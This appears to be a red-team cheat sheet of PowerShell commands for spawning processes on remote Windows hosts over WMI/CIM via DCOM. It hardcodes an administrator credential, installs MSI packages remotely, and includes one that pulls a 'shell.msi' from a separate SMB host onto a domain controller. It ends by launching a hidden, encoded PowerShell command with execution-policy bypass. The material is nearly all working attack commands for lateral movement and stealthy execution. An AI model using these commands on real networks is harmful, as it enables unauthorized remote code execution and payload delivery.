### Remotely Process Spawning

### Invoke-CimMethod
```
$username = 'administrator';
$password = 'P@ssw0rd';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
$Opt = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName 192.168.10.142 -Credential $credential -SessionOption $Opt -ErrorAction Stop
Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}


Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine='calc.exe'; CurrentDirectory='C:\windows'}
Invoke-WmiMethod -Path win32_product -name install -argumentlist @($true,"","\\192.168.1.4\sharename\shell.msi") -ComputerName dc1 -Credential $credential
$Command = "powershell.exe -encodedCommand $SBEncoded -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden"
Invoke-CimMethod -CimSession $Session -Namespace root\cimv2 -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine=$Command}

```
